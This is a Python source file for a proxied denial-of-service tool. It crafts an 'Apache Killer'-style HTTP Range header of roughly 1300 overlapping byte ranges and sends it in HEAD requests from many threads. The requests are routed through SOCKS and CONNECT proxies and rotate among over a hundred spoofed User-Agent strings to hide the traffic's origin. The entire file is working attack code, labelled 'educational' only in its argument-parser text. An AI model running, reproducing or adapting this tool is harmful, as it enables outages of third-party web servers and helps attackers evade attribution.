import socket
import threading
import random
import time
import argparse
from urllib.parse import urlparse
import socks # PySocks library

# --- Configuration & Globals ---

# List of User-Agent strings to mimic different browsers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 Edg/99.0.1150.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.50",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Slackbot 1.0 (+https://api.slack.com/robots)",
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient/4.5.5 (Java/1.8.0_181))",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0) Gecko/20100101 Firefox/9.0",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.00",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.70 Safari/537.36",
    "Mozilla/5.0 (PlayStation 4) AppleWebKit/537.73 (KHTML, like Gecko)",
    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7455.US",
    "curl/7.68.0",
    "Wget/1.20.3 (linux-gnu)",
    "Python/3.9 aiohttp/3.8.1",
    "Go-http-client/1.1",
    "Dalvik/2.1.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020)",
    "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotbot.com/)",
    "rogerbot/1.0 (http://moz.com/bot.html)",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.9 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Mj12bot/v1.4.8; http://mj12bot.com/)",
    "msnbot/2.0b (+http://search.msn.com/msnbot.htm)",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/14.14295",
    "Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.22) Gecko/20100916 Firefox/3.6.22",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) (via W3C-Validation)",
    "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
    "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 10; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0",
    "Mozilla/5.0 (X11; CrOS x86_64 14092.65.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.107 Safari/537.36",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SEMrushBot/7~desktop (+http://www.semrush.com/bot.html)",
    "Pinterestbot/1.0 (+http://www.pinterest.com/)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1",
    "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.10.229 Version/11.62",
    "Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)",
    "Mozilla/5.0 (compatible; Silk/3.49; like Gecko) adid/f464522f-d86b-4c07-8898-18e001878b67",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
    "Mozilla/5.0 (compatible; petaparkbot; +http://petapark.com/petaparkbot)",
    "Mozilla/5.0 (compatible; archive.org_bot; Wayback-Process)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Vivaldi/5.0.2497.35",
    "Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; ASUS_Z01QD Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; oBot/2.7.2; http://www.obot.online/)",
    "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)",
    "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
    "Mozilla/5.0 (compatible; Ezooms/1.0; +http://ezooms.org/bot.html)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (compatible; Nutch/1.0; +http://nutch.apache.org/bot.html)",
    "BLEXBot/1.0 (+http://webmeup-crawler.com/)",
    "SMTBot/1.0 (http://www.similartech.com/smtbot)",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 5.0; en-us; Nexus 10 Build/LRX21P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "GrapeshotCrawler/2.0 (+http://www.grapeshot.co.uk/crawler.php)",
    "AdIdxBot/1.1 (+http://www.adidx.net/bot.html)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
    "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots)",
    "Cliqzbot/3.0",
    "Mozilla/5.0 (compatible; Yeti/1.1; +http://help.naver.com/robots/)",
    "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBCR/T-Mobile;FBID/phone;FBLC/en_US;FBPN/com.facebook.Facebook]",
    "Mozilla/5.0 (Linux; Android 9; motorola one vision) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (compatible; MegaIndex/2.0; +http://megaindex.com/crawler)",
    "Mozilla/5.0 (compatible; Spinn3r/4.0; +http://www.spinn3r.com/robot)",
    "Mozilla/5.0 (compatible; CoccocBot/1.0; +http://help.coccoc.com/webmaster)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Screaming Frog SEO Spider/17.0; +http://www.screamingfrog.co.uk/seo-spider/)",
    "Mozilla/5.0 (compatible; archive.org_bot; +http://archive.org/details/archive.org_bot)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.50",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edge/96.0.1054.62",
    "Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (compatible; Bytewise/2.0; +http://www.bytewises.com/)",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; XQ-AT51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; heritrix/3.4.0-20160627 +http://www.example.com)",
    "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36",
    "Mozilla/5.0 (X11; NetBSD amd64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Mozilla/5.0 (compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.9; http://mj12bot.com/)",
    "Mozilla/5.0 (compatible; CCBot/2.0; +http://commoncrawl.org/faq/)",
    "Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.83 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Discobot/1.0; +https://www.discobot.com/)",
    "Mozilla/5.0 (compatible; evc-crawler; +https://www.evercontact.com/evc-crawler)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0"
]

# Global list to hold proxy information
PROXIES = []
# Global flag to control thread execution
ATTACK_RUNNING = True

# --- Core Attack Logic ---

def generate_range_header():
    """
    Generates the malicious 'Range' header value that exhausts server resources.
    This is the core of the Apache Killer-style attack.
    """
    byte_ranges = "0-"
    # Generate a large number of overlapping byte ranges
    for i in range(1300):
        byte_ranges += f",5-{i}"
    return byte_ranges

def get_target_info(url):
    """Parses the URL to get host and port."""
    parsed_url = urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 80 # Default to port 80 if not specified
    if not host:
        raise ValueError("Could not parse hostname from URL")
    return host, port, socket.gethostbyname(host)

def attacker_thread():
    """
    The main function for each attacker thread.
    It continuously sends malicious requests through different proxies.
    """
    # Generate the malicious headers once per thread
    range_header = generate_range_header()

    while ATTACK_RUNNING:
        proxy = random.choice(PROXIES)
        proxy_ip, proxy_port, proxy_type = proxy['ip'], proxy['port'], proxy['type'].lower()
        
        s = None
        try:
            # Set up the socket based on the proxy type
            if 'socks5' in proxy_type:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            elif 'socks4' in proxy_type:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS4, proxy_ip, proxy_port)
            elif 'connect' in proxy_type or 'tunnel' in proxy_type:
                # HTTP CONNECT proxy requires a manual handshake
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((proxy_ip, proxy_port))
                connect_req = f"CONNECT {TARGET_IP}:{TARGET_PORT} HTTP/1.0\r\n\r\n".encode('utf-8')
                s.sendall(connect_req)
                response = s.recv(1024)
                if not b"200 OK" in response:
                    # Failed to tunnel, skip this proxy for now
                    s.close()
                    continue
            else: # No proxy or unknown type
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to the final target
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Construct and send the malicious payload
            user_agent = random.choice(USER_AGENTS)
            payload = (
                f"HEAD / HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Range: bytes={range_header}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode('utf-8')

            s.sendall(payload)
            
        except (socket.error, socks.ProxyError, socket.timeout) as e:
            # If any connection error occurs, we just ignore it and move on
            # In a real attack, the proxy might be marked as 'bad' and retried later
            pass
        finally:
            if s:
                s.close()
        
        # A small delay to prevent overwhelming the local CPU/network instantly
        time.sleep(0.05)


# --- Main Execution ---

def main():
    parser = argparse.ArgumentParser(
        description="Python equivalent of a DDoS tool for educational purposes.",
        epilog="WARNING: Use this tool responsibly and legally. Unauthorized attacks are illegal."
    )
    parser.add_argument("url", help="The target URL (e.g., http://example.com)")
    parser.add_argument("threads", type=int, help="Number of attacker threads to launch.")
    parser.add_argument("proxy_file", help="File containing a list of proxies (format: ip:port:type).")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds.")
    
    args = parser.parse_args()

    # --- Setup ---
    print("--- DDoS Tool (Educational Version) ---")
    
    # Parse proxy file
    try:
        with open(args.proxy_file, 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) == 3:
                    PROXIES.append({'ip': parts[0], 'port': int(parts[1]), 'type': parts[2]})
        if not PROXIES:
            print("Error: Proxy file is empty or malformed. Exiting.")
            return
        print(f"Successfully loaded {len(PROXIES)} proxies.")
    except Exception as e:
        print(f"Error reading proxy file: {e}")
        return

    # Set global target info
    global TARGET_HOST, TARGET_PORT, TARGET_IP
    try:
        TARGET_HOST, TARGET_PORT, TARGET_IP = get_target_info(args.url)
        print(f"Target set to {TARGET_HOST} ({TARGET_IP}) on port {TARGET_PORT}.")
    except Exception as e:
        print(f"Error: Invalid target URL. {e}")
        return
        
    # --- Launch Attack ---
    print(f"\nStarting attack with {args.threads} threads for {args.duration} seconds.")
    print("Press Ctrl+C to stop early.")
    
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attacker_thread)
        t.daemon = True # Allows main thread to exit even if attack threads are running
        t.start()
        threads.append(t)

    # --- Wait for duration and Cleanup ---
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    finally:
        global ATTACK_RUNNING
        ATTACK_RUNNING = False
        print("Attack finished. Shutting down threads.")

if __name__ == "__main__":
    main()
